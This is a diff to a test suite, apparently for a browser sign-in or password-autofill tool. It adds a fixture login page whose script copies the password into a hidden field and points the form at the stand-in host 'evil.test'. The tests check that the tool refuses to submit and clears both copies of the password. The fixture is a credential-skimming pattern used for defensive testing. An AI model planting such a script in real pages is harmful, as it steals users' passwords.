@@ -55,6 +55,12 @@ PAGES = {
         "<input name=username><input type=password name=p id=p><input type=hidden name=c id=c>"
     )
     + '<script>p.addEventListener("change", () => { c.value = p.value; })</script>',
+    # the password's change handler copies it and moves the form off-trust
+    "/login/late": FORM.format(
+        "<input name=username><input type=password name=p id=p><input type=hidden name=c id=c>"
+    )
+    + '<script>p.addEventListener("change", () => { c.value = p.value;'
+    ' document.forms[0].action = "https://evil.test/late"; })</script>',
 }
 EXPECTED = {
     "/login/mfa": "challenge",
@@ -70,6 +76,7 @@ EXPECTED = {
     "/login/tenant": "changed",
     "/login/typed": "typing",
     "/login/state": "password",
+    "/login/late": "password",  # refused, but counted: the page saw the password
 }
 
 
@@ -138,9 +145,11 @@ def test_sign_in_script_on_real_forms(browser: Any) -> None:
             for path, expected in EXPECTED.items():
                 page.goto(origin + path)
                 assert sign_in_headless(page, _login(origin), set(), sync_api.Error) == expected
-                if path == "/login/tenant":  # not submitted: the typed password is taken back
-                    assert page.input_value("input[name=p]") == ""
+                if path in ("/login/tenant", "/login/late"):  # not submitted
+                    assert page.input_value("input[name=p]") == ""  # never typed, or taken back
                     assert page.locator("[data-codapact-fill]").count() == 0
+                if path == "/login/late":  # the page was told: its copy is gone too
+                    assert page.input_value("#c") == ""
                 page.wait_for_timeout(200)
             # a window without a password leaves the password box to the person
             page.goto(origin + "/login/csrf")
